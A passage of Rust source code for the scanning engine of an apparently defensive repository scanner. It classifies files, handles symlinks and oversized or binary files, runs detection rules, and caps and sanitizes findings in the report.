//! Running rules over a repository.

use std::borrow::Cow;
use std::collections::HashSet;
use std::fs::{self, File};
use std::io::{self, BufRead, BufReader, Read};
use std::ops::Range;
use std::path::{Component, Path, PathBuf};

use crate::checks::{Check, Ctx, Decode, FileIssue, HEAD_LEN, Hit, RepoIndex, TextSpan, Views};
use crate::finding::{Finding, Severity};
use crate::rule::{Matcher, Rule};
use crate::sanitize::{display_safe, snippet_safe, to_slash};
use crate::walk::{self, Limits, SkipReason, Skipped};
use regex::Regex;

/// Explanations built from text in the scanned repository are cut to this.
const MAX_EXPLANATION_CHARS: usize = 300;

/// How many leading bytes are checked to tell text from binary files.
const BINARY_SNIFF_LEN: usize = 8 * 1024;

/// Extensions of files that a shell, an interpreter or a script host reads as
/// text. A NUL byte in one of them does not make it a binary: `bash`, `node`
/// and the others still run it, so the line rules must still look at it.
const SCRIPT_EXTENSIONS: &[&str] = &[
    "sh", "bash", "zsh", "ksh", "csh", "fish", "py", "pyw", "js", "mjs", "cjs", "jsx", "ts", "tsx",
    "rb", "pl", "pm", "php", "ps1", "psm1", "psd1", "bat", "cmd", "vbs", "wsf", "lua",
];

/// A file with NUL bytes that is not a script is read by the line rules only
/// if at most one byte in this many is NUL. Text with a stray NUL has a
/// handful of them; padding in a data format, or ASCII text in UTF-16 without a
/// byte order mark (one byte in two), has far more. One in eight is above any
/// accidental NUL in text and well below the density of such data.
const MAX_NUL_RATIO: u64 = 8;

/// One file check may list at most this many findings for one file; the rest
/// are summarized on the last one, so a hostile file cannot flood the report.
const MAX_FINDINGS_PER_FILE_CHECK: usize = 100;

/// A line rule lists at most this many findings per file; the rest are only
/// counted (`Report::unlisted`), so a hostile file cannot flood the report.
const MAX_LINE_FINDINGS_PER_RULE: usize = 100;

/// A snippet shows at most this many characters of its line.
const MAX_SNIPPET_CHARS: usize = 120;

/// When a match is further into a long line, its snippet starts this many
/// characters before it, so the match is always in view.
const SNIPPET_LEAD_CHARS: usize = 40;

/// Column, span and snippet are worked out for at most this many hits of one
/// check in one file; the rest keep their line. Locating a hit looks back to
/// the start of its line, so without a cap a hostile file with many hits on one
/// very long line would make that quadratic.
const MAX_LOCATED_HITS: usize = 100;

/// Added to findings from a file that has NUL bytes and does not read as text.
const BINARY_LOOKING_NOTE: &str = " (found in a binary-looking file)";

/// Everything one scan produced. Front ends decide how to show it.
#[derive(Debug, Default)]
pub struct Report {
    /// Sorted by file, then line, then rule ID.
    pub findings: Vec<Finding>,
    /// Number of files that were read and analysed: text files, and binary
    /// files that a file-level rule examined.
    pub files_scanned: usize,
    /// Findings a line rule produced beyond the per-file limit, which are not
    /// in `findings`.
    pub unlisted: Vec<Unlisted>,
    /// Files that were not (fully) analysed, with the reason. Nothing is left
    /// out silently: binary, oversized, symlinked and unreadable files are all
    /// listed here.
    pub skipped: Vec<Skipped>,
    /// True if the file-count limit cut the scan short.
    pub truncated: bool,
}

/// Findings of one rule in one file that were counted but not listed.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Unlisted {
    pub file: PathBuf,
    pub rule_id: String,
    /// The level of the rule: every finding of one rule has the same level, and
    /// the limit applies per rule, so a flood of LOW findings from one rule can
    /// never push a CRITICAL one from another rule out of the list.
    pub severity: Severity,
    pub count: usize,
}

impl Report {
    /// Whether the scan can vouch for what it looked at. A report with no
    /// findings is only a clean bill of health when this is true: a payload
    /// may sit past the file limit, in a file that was too large or could not
    /// be opened, or in an executable nobody analyzes yet.
    pub fn is_complete(&self) -> bool {
        !self.truncated && self.inconclusive_count() == 0
    }

    /// Number of skipped files that make the scan inconclusive, see
    /// `SkipReason::makes_scan_inconclusive`.
    pub fn inconclusive_count(&self) -> usize {
        self.skipped
            .iter()
            .filter(|skipped| skipped.reason.makes_scan_inconclusive())
            .count()
    }
}

/// Scans every file under `root` with every rule.
///
/// All rules always run; hiding findings by severity, stage or family is
/// left to the front end, so filters can change without rescanning.
pub fn scan(root: &Path, rules: &[Rule], limits: Limits) -> Report {
    let walked = walk::walk(root, limits);

    // Where files are allowed to be looked up: everything the walk saw,
    // including files it did not hand over because of the size limit or
    // because they are symlinks.
    let index = RepoIndex::new(
        walked
            .files
            .iter()
            .map(|path| to_slash(path))
            .chain(
                walked
                    .skipped
                    .iter()
                    .filter_map(|skipped| match skipped.reason {
                        SkipReason::TooLarge { .. } | SkipReason::Symlink { .. } => {
                            Some(to_slash(&skipped.path))
                        }
                        _ => None,
                    }),
            ),
    );
    let regular_files: HashSet<String> = walked.files.iter().map(|path| to_slash(path)).collect();
    let file_rules: Vec<(&Rule, Check)> = rules
        .iter()
        .filter_map(|rule| match rule.matcher {
            Matcher::File(check) => Some((rule, check)),
            _ => None,
        })
        .collect();
    let head_rules: Vec<(&Rule, Check)> = rules
        .iter()
        .filter_map(|rule| match rule.matcher {
            Matcher::Head(check) => Some((rule, check)),
            _ => None,
        })
        .collect();
    let env = Env {
        index: &index,
        truncated: walked.truncated,
        file_rules: &file_rules,
        head_rules: &head_rules,
    };
    // Files over the size limit that the walk itself listed. Head rules see
    // them by name; files read as a stream get their head rules there.
    let walk_too_large: HashSet<PathBuf> = walked
        .skipped
        .iter()
        .filter(|entry| matches!(entry.reason, SkipReason::TooLarge { .. }))
        .map(|entry| entry.path.clone())
        .collect();

    let mut report = Report {
        truncated: walked.truncated,
        ..Report::default()
    };
    let mut skipped = walked.skipped;

    let has_file_rule = |slash_path: &str| {
        file_rules
            .iter()
            .any(|(rule, _)| rule.applies_to(slash_path))
    };

    for relative in &walked.files {
        let slash_path = to_slash(relative);

        // A file too big to hold in memory is read as a stream, and only the
        // line rules look at it.
        let size = fs::metadata(root.join(relative)).map_or(0, |metadata| metadata.len());
        if size > limits.max_buffered_size {
            let streamed = scan_streamed(
                root,
                relative,
                &slash_path,
                size,
                rules,
                &limits,
                has_file_rule(&slash_path),
                &env,
                &mut report.unlisted,
            );
            report.findings.extend(streamed.findings);
            report.files_scanned += usize::from(streamed.scanned);
            skipped.extend(streamed.skipped);
            continue;
        }

        let bytes = match fs::read(root.join(relative)) {
            Ok(bytes) => bytes,
            Err(err) => {
                skipped.push(Skipped {
                    path: relative.clone(),
                    reason: SkipReason::Unreadable {
                        error: err.to_string(),
                    },
                });
                continue;
            }
        };

        let class = classify(&slash_path, &bytes);
        let views = Views::new(&bytes, class.decode);

        // File-level rules see the raw bytes whatever the classification says,
        // so a file is judged the way its consumer reads it, even if it looks
        // like a binary here.
        let checked = env.run_file_checks(relative, &slash_path, &views, None);
        report.findings.extend(checked.findings);
        let headed = env.run_head_checks(
            relative,
            &slash_path,
            head_of(&bytes),
            None,
            class.executable,
        );
        report.findings.extend(headed.findings);

        // An executable is always listed, since nothing analyzes its code. It
        // makes the scan inconclusive unless a rule that names executables
        // reported it; a finding of any other rule does not count, nor does a
        // file rule that looked at it (that rule saw the bytes of a `.pth` or
        // `.start` file, not the code of the program).
        if let Some(format) = class.executable {
            skipped.push(Skipped {
                path: relative.clone(),
                reason: SkipReason::Executable {
                    format,
                    reported: headed.named_executable,
                },
            });
            if checked.examined {
                report.files_scanned += 1;
            }
            continue;
        }
        if class.binary_looking {
            skipped.push(Skipped {
                path: relative.clone(),
                reason: SkipReason::Binary,
            });
        }

        report.files_scanned += 1;
        let mut found = scan_text(
            relative,
            &slash_path,
            &views,
            class.nul_line,
            &env,
            rules,
            &mut report.unlisted,
        );
        if class.binary_looking {
            for finding in &mut found {
                finding.explanation.push_str(BINARY_LOOKING_NOTE);
            }
        }
        report.findings.extend(found);
    }

    // Entries the walk did not hand over still matter to a rule that asks for
    // that file by name: an oversized file or a symlink is not a way around it.
    let walk_skips: Vec<Skipped> = skipped.clone();
    for entry in &walk_skips {
        let slash_path = to_slash(&entry.path);
        let checked = match &entry.reason {
            SkipReason::TooLarge { size } => {
                let issue = FileIssue::TooLarge { size: *size };
                if walk_too_large.contains(&entry.path) {
                    // Only the first bytes are read, for the head rules (and
                    // a PE signature, see `native_format`).
                    let path = root.join(&entry.path);
                    let (head, executable) = read_head(&path).unwrap_or_default();
                    let headed = env.run_head_checks(
                        &entry.path,
                        &slash_path,
                        &head,
                        Some(issue.clone()),
                        executable,
                    );
                    report.findings.extend(headed.findings);
                }
                env.run_file_checks(
                    &entry.path,
                    &slash_path,
                    &Views::new(&[], Decode::Utf8WithoutNuls),
                    Some(issue),
                )
            }
            SkipReason::Symlink { target } => {
                let target_text = target
                    .as_deref()
                    .map(|target| target.to_string_lossy().into_owned());
                let resolved = target_text
                    .as_deref()
                    .and_then(|target| resolve_link_text(&slash_path, target));
                // Head rules get at most the first bytes of a regular file the
                // link points at inside the repository; there may be any number
                // of links, so nothing more is read for them.
                let (head, executable) = resolved
                    .as_ref()
                    .filter(|path| regular_files.contains(*path))
                    .and_then(|path| read_head(&root.join(path)))
                    .unwrap_or_default();
                let issue = FileIssue::Symlink {
                    target: target_text,
                    resolved,
                };
                let headed = env.run_head_checks(
                    &entry.path,
                    &slash_path,
                    &head,
                    Some(issue.clone()),
                    executable,
                );
                report.findings.extend(headed.findings);
                // File rules get the whole target, as before, and only when one
                // selects the link.
                let bytes = if has_file_rule(&slash_path) {
                    symlink_target_bytes(root, &entry.path, target.as_deref(), &regular_files)
                } else {
                    Vec::new()
                };
                // Read the way the target would be read under the link's name.
                let views = Views::new(&bytes, classify(&slash_path, &bytes).decode);
                env.run_file_checks(&entry.path, &slash_path, &views, Some(issue))
            }
            _ => continue,
        };
        report.findings.extend(checked.findings);
    }

    report.skipped = skipped;
    report
        .findings
        .sort_by(|a, b| (&a.file, a.line, &a.rule_id).cmp(&(&b.file, b.line, &b.rule_id)));
    report
}

/// What a scan shares between files.
struct Env<'a> {
    index: &'a RepoIndex,
    truncated: bool,
    file_rules: &'a [(&'a Rule, Check)],
    head_rules: &'a [(&'a Rule, Check)],
}

/// The outcome of offering one file to the file-level or head rules.
struct Checked {
    /// True if at least one of those rules applies to this path.
    examined: bool,
    /// True if a rule that names executables (`Rule::names_executables`)
    /// reported the file.
    named_executable: bool,
    findings: Vec<Finding>,
}

/// The first bytes of a file, as head rules see them.
fn head_of(bytes: &[u8]) -> &[u8] {
    &bytes[..bytes.len().min(HEAD_LEN)]
}

impl Env<'_> {
    fn run_file_checks<'v>(
        &'v self,
        relative: &Path,
        slash_path: &'v str,
        views: &'v Views<'v>,
        issue: Option<FileIssue>,
    ) -> Checked {
        self.run_checks(self.file_rules, relative, slash_path, views, issue)
    }

    /// Offers a file's name and first bytes to the head rules. `head` is
    /// empty for a file that was not read.
    fn run_head_checks(
        &self,
        relative: &Path,
        slash_path: &str,
        head: &[u8],
        issue: Option<FileIssue>,
        executable: Option<&'static str>,
    ) -> Checked {
        let views = Views::new(head, classify(slash_path, head).decode).with_executable(executable);
        self.run_checks(self.head_rules, relative, slash_path, &views, issue)
    }

    fn run_checks<'v>(
        &'v self,
        rules: &'v [(&'v Rule, Check)],
        relative: &Path,
        slash_path: &'v str,
        views: &'v Views<'v>,
        issue: Option<FileIssue>,
    ) -> Checked {
        let mut checked = Checked {
            examined: false,
            named_executable: false,
            findings: Vec::new(),
        };
        let own_bytes = issue.is_none();
        for (rule, check) in rules {
            if !rule.applies_to(slash_path) {
                continue;
            }
            checked.examined = true;
            let ctx = Ctx::new(
                slash_path,
                issue.clone(),
                self.index,
                self.truncated,
                rule.severity,
                views,
            );
            let mut hits = check(&ctx);
            checked.named_executable |= rule.names_executables && !hits.is_empty();
            let unlisted = hits.len().saturating_sub(MAX_FINDINGS_PER_FILE_CHECK);
            hits.truncate(MAX_FINDINGS_PER_FILE_CHECK);

            let start = checked.findings.len();
            for (index, hit) in hits.into_iter().enumerate() {
                checked
                    .findings
                    .push(hit_finding(rule, relative, hit, index, views, own_bytes));
            }
            if unlisted > 0
                && let Some(last) = checked.findings[start..].last_mut()
            {
                last.explanation.push_str(&format!(
                    " [{unlisted} more from this rule in this file not listed]"
                ));
            }
        }
        checked
    }
}

/// The content of the file a symlink points at, if that is a regular file
/// inside the repository; empty otherwise. The target is resolved as text, so
/// nothing outside the scanned directory is ever opened.
fn symlink_target_bytes(
    root: &Path,
    link: &Path,
    target: Option<&Path>,
    regular_files: &HashSet<String>,
) -> Vec<u8> {
    let Some(resolved) = target.and_then(|target| resolve_inside(link, target)) else {
        return Vec::new();
    };
    if !regular_files.contains(&to_slash(&resolved)) {
        return Vec::new();
    }
    fs::read(root.join(resolved)).unwrap_or_default()
}

/// The first `HEAD_LEN` bytes of a file, read without reading the rest, and
/// its native executable format (see `native_format`).
fn read_head(path: &Path) -> Option<(Vec<u8>, Option<&'static str>)> {
    let file = File::open(path).ok()?;
    let size = file.metadata().ok()?.len();
    let mut head = Vec::new();
    file.take(HEAD_LEN as u64).read_to_end(&mut head).ok()?;
    let executable = native_format(&head, Some((path, size)));
    Some((head, executable))
}

/// The Windows loader accepts a PE header up to this far into the file.
const MAX_PE_OFFSET: u64 = 256 * 1024 * 1024;

/// The native executable format of a file, from its first bytes. For an `MZ`
/// header, the `PE\0\0` signature where `e_lfanew` (offset 0x3C) points
/// decides, whatever else the bytes hold: a PE needs no NUL byte in its
/// first 8 KiB, since every DOS header field but those two can be anything,
/// and its header can lie up to 256 MiB into the file. When the signature is
/// past `head`, `file` (the path and the size) lets one 4-byte read check
/// it. When it cannot be checked at all, binary content starting with `MZ`
/// still counts, as before. Other formats need binary content (a NUL byte
/// in the first 8 KiB, which their headers always have).
pub(crate) fn native_format(head: &[u8], file: Option<(&Path, u64)>) -> Option<&'static str> {
    if !head.starts_with(b"MZ") {
        return if looks_binary(head) {
            executable_format(head)
        } else {
            None
        };
    }
    if let Some(&[a, b, c, d]) = head.get(0x3C..0x40) {
        let offset = u64::from(u32::from_le_bytes([a, b, c, d]));
        let in_head = usize::try_from(offset)
            .ok()
            .and_then(|start| head.get(start..start.checked_add(4)?));
        if let Some(signature) = in_head {
            return (signature == b"PE\0\0").then_some("PE");
        }
        if let Some((path, size)) = file
            && offset < MAX_PE_OFFSET
            && offset + 4 <= size
            && let Some(signature) = read_at(path, offset)
        {
            return (signature == *b"PE\0\0").then_some("PE");
        }
    }
    looks_binary(head).then_some("PE")
}

/// Four bytes of a file at `offset`, or `None` if they cannot be read.
fn read_at(path: &Path, offset: u64) -> Option<[u8; 4]> {
    use std::io::{Seek, SeekFrom};
    let mut file = File::open(path).ok()?;
    file.seek(SeekFrom::Start(offset)).ok()?;
    let mut bytes = [0; 4];
    file.read_exact(&mut bytes).ok()?;
    Some(bytes)
}

/// Resolves a symbolic link's target as text, the way either Unix or Windows
/// could read it, whatever system the scan runs on: `/` and `\` both separate
/// components, and a target that starts with a separator, a drive letter
/// (`C:`) or a UNC or device prefix (`\\host`, `\\?\`, `\??\`) is absolute.
/// Returns the repository path (with `/`) the link at `link` points at, or
/// `None` when the target is absolute or climbs above the root.
fn resolve_link_text(link: &str, target: &str) -> Option<String> {
    let bytes = target.as_bytes();
    let drive = bytes.len() >= 2 && bytes[0].is_ascii_alphabetic() && bytes[1] == b':';
    if target.starts_with(['/', '\\']) || drive {
        return None;
    }
    let mut parts: Vec<&str> = link.split('/').collect();
    parts.pop();
    for part in target.split(['/', '\\']) {
        match part {
            "" | "." => {}
            ".." => {
                parts.pop()?;
            }
            _ => parts.push(part),
        }
    }
    Some(parts.join("/"))
}

/// Resolves `target` relative to the directory of `link`, purely lexically.
/// Returns `None` for absolute targets and for targets that leave the root.
fn resolve_inside(link: &Path, target: &Path) -> Option<PathBuf> {
    let mut resolved: Vec<_> = link.parent()?.components().collect();
    for component in target.components() {
        match component {
            Component::Normal(_) => resolved.push(component),
            Component::CurDir => {}
            Component::ParentDir => {
                resolved.pop()?;
            }
            Component::RootDir | Component::Prefix(_) => return None,
        }
    }
    Some(resolved.into_iter().collect())
}

/// Runs the line-regex rules over lines fed one at a time, keeping at most
/// `MAX_LINE_FINDINGS_PER_RULE` findings per rule and counting the rest.
struct LineScanner<'a> {
    rules: Vec<(&'a Rule, &'a Regex)>,
    listed: Vec<usize>,
    hidden: Vec<usize>,
    findings: Vec<Finding>,
}

impl<'a> LineScanner<'a> {
    fn new(rules: &[&'a Rule]) -> Self {
        let rules: Vec<_> = rules
            .iter()
            .filter_map(|&rule| match &rule.matcher {
                Matcher::LineRegex(pattern) => Some((rule, pattern)),
                _ => None,
            })
            .collect();
        LineScanner {
            listed: vec![0; rules.len()],
            hidden: vec![0; rules.len()],
            rules,
            findings: Vec::new(),
        }
    }

    fn is_empty(&self) -> bool {
        self.rules.is_empty()
    }

    /// `file_offset` is where the line starts in the file, given only when
    /// the file's text is its bytes exactly, so a span is never wrong;
    /// `column_exact` says whether a count of characters is a column (see
    /// `Views::columns_are_exact`).
    fn feed(
        &mut self,
        relative: &Path,
        line_number: usize,
        line: &str,
        file_offset: Option<usize>,
        column_exact: bool,
    ) {
        for (index, (rule, pattern)) in self.rules.iter().enumerate() {
            if self.listed[index] == MAX_LINE_FINDINGS_PER_RULE {
                if pattern.is_match(line) {
                    self.hidden[index] += 1;
                }
                continue;
            }
            // `find` matches exactly when `is_match` does, and says where.
            let Some(found) = pattern.find(line) else {
                continue;
            };
            self.listed[index] += 1;
            let span = file_offset.map(|start| start + found.start()..start + found.end());
            let location =
                Location::in_line(line, found.start(), line_number == 1, column_exact, span);
            self.findings.push(Finding {
                rule_id: rule.id.clone(),
                severity: rule.severity,
                stage: rule.stage,
                attack: rule.attack.clone(),
                file: relative.to_path_buf(),
                line: line_number,
                column: location.column,
                span: location.span,
                snippet: location.snippet,
                explanation: rule.description.clone(),
            });
        }
    }

    fn finish(self, relative: &Path, unlisted: &mut Vec<Unlisted>) -> Vec<Finding> {
        for ((rule, _), hidden) in self.rules.iter().zip(&self.hidden) {
            if *hidden > 0 {
                unlisted.push(Unlisted {
                    file: relative.to_path_buf(),
                    rule_id: rule.id.clone(),
                    severity: rule.severity,
                    count: *hidden,
                });
            }
        }
        self.findings
    }
}

/// What reading one large file as a stream produced.
#[derive(Default)]
struct Streamed {
    findings: Vec<Finding>,
    skipped: Vec<Skipped>,
    /// Whether the line rules read the file.
    scanned: bool,
}

/// Scans a file that is too big to hold in memory, one line at a time.
///
/// It is classified like a small file: an executable is listed and not read
/// further; a script keeps its NUL rule; data that does not read as text is
/// read as ASCII only. That needs two passes: the first measures the file
/// (`NulProbe`), the second runs the line rules. Rules that need the whole
/// file (file-level and JSONC rules) cannot run, so if one applies the file is
/// listed as too large, which makes the scan inconclusive, as before.
#[allow(clippy::too_many_arguments)]
fn scan_streamed(
    root: &Path,
    relative: &Path,
    slash_path: &str,
    size: u64,
    rules: &[Rule],
    limits: &Limits,
    file_rule_applies: bool,
    env: &Env<'_>,
    unlisted: &mut Vec<Unlisted>,
) -> Streamed {
    let mut out = Streamed::default();
    let unreadable = |err: io::Error| Skipped {
        path: relative.to_path_buf(),
        reason: SkipReason::Unreadable {
            error: err.to_string(),
        },
    };
    let path = root.join(relative);

    let mut head = Vec::new();
    let read_head = File::open(&path)
        .and_then(|file| file.take(BINARY_SNIFF_LEN as u64).read_to_end(&mut head));
    if let Err(err) = read_head {
        out.skipped.push(unreadable(err));
        return out;
    }
    // Head rules need only the name and the first bytes, so a large file is
    // no way around them, and they never make it count as too large.
    let executable = native_format(&head, Some((&path, size)));
    let headed = env.run_head_checks(relative, slash_path, head_of(&head), None, executable);
    let named_executable = headed.named_executable;
    out.findings.extend(headed.findings);
    let applicable: Vec<&Rule> = rules
        .iter()
        .filter(|rule| rule.applies_to(slash_path))
        .collect();
    let whole_file_rule = file_rule_applies
        || applicable
            .iter()
            .any(|rule| matches!(rule.matcher, Matcher::Jsonc(_)));
    let too_large = Skipped {
        path: relative.to_path_buf(),
        reason: SkipReason::TooLarge { size },
    };
    // A rule that selects the file by name gets to see it as too large (that
    // happens after the walk), executable or not, as for a file over the limit.
    if let Some(format) = executable {
        if whole_file_rule {
            out.skipped.push(too_large);
        }
        // As for a file read whole.
        out.skipped.push(Skipped {
            path: relative.to_path_buf(),
            reason: SkipReason::Executable {
                format,
                reported: named_executable,
            },
        });
        return out;
    }

    let script = is_script(slash_path, &head);
    if has_utf16_bom(&head) && has_script_extension(slash_path) {
        // Decoding UTF-16 needs the whole file; nothing can be said about it.
        out.skipped.push(too_large);
        return out;
    }
    if whole_file_rule {
        out.skipped.push(too_large);
    }

    // First pass: how much of the file is NUL, and is the rest text.
    let mut probe = NulProbe::default();
    let measured = File::open(&path).and_then(|mut file| {
        let mut chunk = vec![0; 64 * 1024];
        loop {
            match file.read(&mut chunk)? {
                0 => return Ok(()),
                n => probe.feed(&chunk[..n]),
            }
        }
    });
    if let Err(err) = measured {
        out.skipped.push(unreadable(err));
        return out;
    }
    let binary_looking = !script
        && ((looks_binary(&head) && known_binary_magic(&head))
            || (probe.nuls > 0 && !probe.is_text()));
    if binary_looking {
        out.skipped.push(Skipped {
            path: relative.to_path_buf(),
            reason: SkipReason::Binary,
        });
    }
    let nul_line = if script { probe.first_nul_line } else { None };
    let identical = !binary_looking && probe.nuls == 0 && probe.is_text();

    for rule in &applicable {
        if let (Matcher::NulByte, Some(line)) = (&rule.matcher, nul_line) {
            // As for a file read whole (`nul_span`).
            let span = probe
                .first_nul_offset
                .and_then(|offset| usize::try_from(offset).ok())
                .map(|offset| offset..offset + 1);
            out.findings.push(Finding {
                rule_id: rule.id.clone(),
                severity: rule.severity,
                stage: rule.stage,
                attack: rule.attack.clone(),
                file: relative.to_path_buf(),
                line,
                column: None,
                span,
                snippet: None,
                explanation: rule.description.clone(),
            });
        }
    }

    // Second pass: the line rules.
    let mut lines = LineScanner::new(&applicable);
    if !lines.is_empty() {
        let file = match File::open(&path) {
            Ok(file) => file,
            Err(err) => {
                out.skipped.push(unreadable(err));
                return out;
            }
        };
        let mut reader = BufReader::new(file);
        let mut line = Vec::new();
        let mut number = 0;
        // Where the next line starts in the file.
        let mut offset: u64 = 0;
        loop {
            line.clear();
            let cap = limits.max_line_size as u64 + 2;
            let line_start = offset;
            match (&mut reader).take(cap).read_until(b'\n', &mut line) {
                Ok(0) => break,
                Ok(read) => offset += read as u64,
                Err(err) => {
                    out.skipped.push(unreadable(err));
                    break;
                }
            }
            number += 1;
            if line.last() != Some(&b'\n') && line.len() > limits.max_line_size {
                out.skipped.push(Skipped {
                    path: relative.to_path_buf(),
                    reason: SkipReason::LineTooLong { line: number },
                });
                break;
            }
            if line.last() == Some(&b'\n') {
                line.pop();
                if line.last() == Some(&b'\r') {
                    line.pop();
                }
            }
            let text = if binary_looking {
                Cow::Owned(ascii_only_text(&line))
            } else {
                text_without_nuls(&line)
            };
            // As for a file read whole, a span is given only when the whole
            // file is its own text: no NUL bytes, valid UTF-8, not read as ASCII.
            let file_offset = if identical {
                usize::try_from(line_start).ok()
            } else {
                None
            };
            lines.feed(relative, number, &text, file_offset, identical);
        }
    }
    let mut found = lines.finish(relative, unlisted);
    if binary_looking {
        for finding in &mut found {
            finding.explanation.push_str(BINARY_LOOKING_NOTE);
        }
    }
    out.findings.append(&mut found);
    out.scanned = true;
    out
}

/// Runs line, JSONC and other text rules over one file's text. `relative` is
/// the path shown in findings; `slash_path` is matched against each rule's
/// `files` globs.
fn scan_text<'v>(
    relative: &Path,
    slash_path: &'v str,
    views: &'v Views<'v>,
    nul_line: Option<usize>,
    env: &'v Env<'v>,
    rules: &[Rule],
    unlisted: &mut Vec<Unlisted>,
) -> Vec<Finding> {
    let applicable: Vec<&Rule> = rules
        .iter()
        .filter(|rule| rule.applies_to(slash_path))
        .collect();
    if applicable.is_empty() {
        return Vec::new();
    }

    let text = views.text();
    let identical = views.text_is_bytes();
    let column_exact = views.columns_are_exact();
    let mut findings = Vec::new();
    let mut lines = LineScanner::new(&applicable);
    for (index, line) in text.lines().enumerate() {
        // `lines` hands out slices of `text`, so the distance between the
        // pointers is where the line starts.
        let file_offset = identical
            .then(|| (line.as_ptr() as usize).checked_sub(text.as_ptr() as usize))
            .flatten();
        lines.feed(relative, index + 1, line, file_offset, column_exact);
    }
    findings.extend(lines.finish(relative, unlisted));
    for rule in applicable {
        match &rule.matcher {
            // Done above, in one pass over the lines.
            Matcher::LineRegex(_) => {}
            Matcher::Jsonc(check) => {
                let ctx = Ctx::new(
                    slash_path,
                    None,
                    env.index,
                    env.truncated,
                    rule.severity,
                    views,
                );
                for (index, hit) in check(&ctx).into_iter().enumerate() {
                    findings.push(hit_finding(rule, relative, hit, index, views, true));
                }
            }
            // File-level and head rules already ran on the raw bytes.
            Matcher::File(_) | Matcher::Head(_) => {}
            Matcher::NulByte => {
                if let Some(line) = nul_line {
                    findings.push(Finding {
                        rule_id: rule.id.clone(),
                        severity: rule.severity,
                        stage: rule.stage,
                        attack: rule.attack.clone(),
                        file: relative.to_path_buf(),
                        line,
                        column: None,
                        span: nul_span(views.bytes()),
                        snippet: None,
                        explanation: rule.description.clone(),
                    });
                }
            }
        }
    }
    findings
}

/// Turns what a check reported into a finding. `own_bytes` is false for an
/// entry the walk did not hand over (an oversized file, or a symbolic link
/// whose bytes are its target's): it has no text of its own to point into, so
/// its findings get no location.
fn hit_finding(
    rule: &Rule,
    relative: &Path,
    hit: Hit,
    index: usize,
    views: &Views<'_>,
    own_bytes: bool,
) -> Finding {
    let location = match &hit.span {
        Some(TextSpan(span)) if own_bytes && index < MAX_LOCATED_HITS => {
            locate_hit(views, hit.line, span)
        }
        _ => Location::default(),
    };
    Finding {
        rule_id: rule.id.clone(),
        severity: hit.severity,
        stage: rule.stage,
        attack: rule.attack.clone(),
        file: relative.to_path_buf(),
        line: hit.line,
        column: location.column,
        span: location.span,
        snippet: location.snippet,
        // The reason may quote the scanned file, so it is cleaned before it can
        // reach a terminal.
        explanation: display_safe(&hit.reason, MAX_EXPLANATION_CHARS),
    }
}

/// Where a check's span is, if it holds up: a span that is reversed, out of
/// bounds or splits a character is dropped, and so is one that is not on the
/// line the check reported. A check that splits lines its own way (the `.pth`
/// rules split on more than `\n`) could otherwise get a column and a snippet
/// from another line than the one it names.
fn locate_hit(views: &Views<'_>, line: usize, span: &Range<usize>) -> Location {
    let text = views.text();
    if span.start > span.end
        || !text.is_char_boundary(span.start)
        || !text.is_char_boundary(span.end)
        || views.line_of(span.start) != line
    {
        return Location::default();
    }
    let identical = views.text_is_bytes();
    Location::in_text(text, span, views.columns_are_exact(), identical)
}

/// Where in its line a finding points.
#[derive(Debug, Default, PartialEq, Eq)]
struct Location {
    column: Option<usize>,
    span: Option<Range<usize>>,
    snippet: Option<String>,
}

impl Location {
    /// `line` is a whole line without its terminator and `at` a byte offset in
    /// it. `column_exact` says whether a count of characters in the line is a
    /// column (see `Views::columns_are_exact`); on the first line of a file a
    /// byte order mark is not counted. `span` is passed through.
    fn in_line(
        line: &str,
        at: usize,
        first_line: bool,
        column_exact: bool,
        span: Option<Range<usize>>,
    ) -> Location {
        let (line, at) = match line.strip_prefix('\u{feff}') {
            Some(rest) if first_line => (rest, at.saturating_sub('\u{feff}'.len_utf8())),
            _ => (line, at),
        };
        let Some(before) = line.get(..at.min(line.len())) else {
            return Location {
                span,
                ..Location::default()
            };
        };
        Location {
            column: column_exact.then(|| before.chars().count() + 1),
            span,
            snippet: Some(snippet(line, before.len())),
        }
    }

    /// `span` is a valid byte range in `text`; `identical` says whether `text`
    /// is the file byte for byte, so the range is also the file's.
    fn in_text(text: &str, span: &Range<usize>, column_exact: bool, identical: bool) -> Location {
        let line_start = text[..span.start].rfind('\n').map_or(0, |at| at + 1);
        let line_end = text[span.start..]
            .find('\n')
            .map_or(text.len(), |at| span.start + at);
        let line = &text[line_start..line_end];
        let line = line.strip_suffix('\r').unwrap_or(line);
        Location::in_line(
            line,
            span.start - line_start,
            line_start == 0,
            column_exact,
            identical.then(|| span.clone()),
        )
    }
}

/// The byte range of the first NUL byte of a file. A NUL finding gets only
/// this: the byte is exact, while a column in text that has the NULs dropped
/// would point next to it.
fn nul_span(bytes: &[u8]) -> Option<Range<usize>> {
    let at = bytes.iter().position(|&b| b == 0)?;
    Some(at..at + 1)
}

/// A short, printable piece of `line` around byte offset `at`. Leading
/// whitespace is dropped and tabs become spaces. Before the match, at most
/// `SNIPPET_LEAD_CHARS` characters of output are kept, counted after escaping,
/// so a run of escaped characters cannot push the match out of view; the match
/// and what follows fill the rest of `MAX_SNIPPET_CHARS`. `...` marks each
/// cut. Only the window is ever escaped, never the whole line.
fn snippet(line: &str, at: usize) -> String {
    let body = line.trim_start();
    let at = at.saturating_sub(line.len() - body.len()).min(body.len());
    let Some((before, after)) = body.split_at_checked(at) else {
        return String::new();
    };
    let shown = |c: char| {
        let mut buffer = [0; 4];
        let text = if c == '\t' {
            " "
        } else {
            &*c.encode_utf8(&mut buffer)
        };
        snippet_safe(text, 16)
    };

    let mut lead = Vec::new();
    let mut used = 0;
    let mut cut = false;
    for c in before.chars().rev() {
        let piece = shown(c);
        let cost = piece.chars().count();
        if used + cost > SNIPPET_LEAD_CHARS {
            cut = true;
            break;
        }
        used += cost;
        lead.push(piece);
    }

    let mut out = String::new();
    if cut {
        out.push_str("...");
    }
    for piece in lead.iter().rev() {
        out.push_str(piece);
    }
    let tail: String = after
        .chars()
        .take(MAX_SNIPPET_CHARS + 1)
        .map(|c| if c == '\t' { ' ' } else { c })
        .collect();
    out.push_str(&snippet_safe(tail.trim_end(), MAX_SNIPPET_CHARS - used));
    out
}

/// What the scanner decides about a file before any rule runs.
struct Class {
    /// The executable format, if the file is one. Such a file is listed and
    /// not read by the text rules.
    executable: Option<&'static str>,
    /// The 1-based line of the first NUL byte in a script.
    nul_line: Option<usize>,
    /// Data with NUL bytes that does not read as text, or with a known binary
    /// header: listed, and read by the line rules as ASCII only.
    binary_looking: bool,
    /// How the text rules read the file.
    decode: Decode,
}

/// Classifies a file from its path and content.
